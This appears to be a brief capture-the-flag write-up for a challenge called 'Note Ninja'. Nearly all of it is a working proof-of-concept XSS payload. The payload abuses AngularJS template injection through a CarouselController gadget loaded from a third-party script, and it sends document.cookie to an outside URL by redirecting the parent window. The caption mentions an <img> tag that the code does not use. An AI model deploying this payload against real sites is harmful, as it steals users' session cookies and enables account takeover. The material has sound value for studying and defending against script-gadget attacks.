# Note Ninja 

## Exploit

A sample POC exploit using <img> tag.

```
++++++++++++++++++++++++++++++++++++++
<p>&#91;[3*3]]</p>

<div
  ng-controller="CarouselController as c"
  ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
++++++++++++++++++++++++++++++++++++++
```
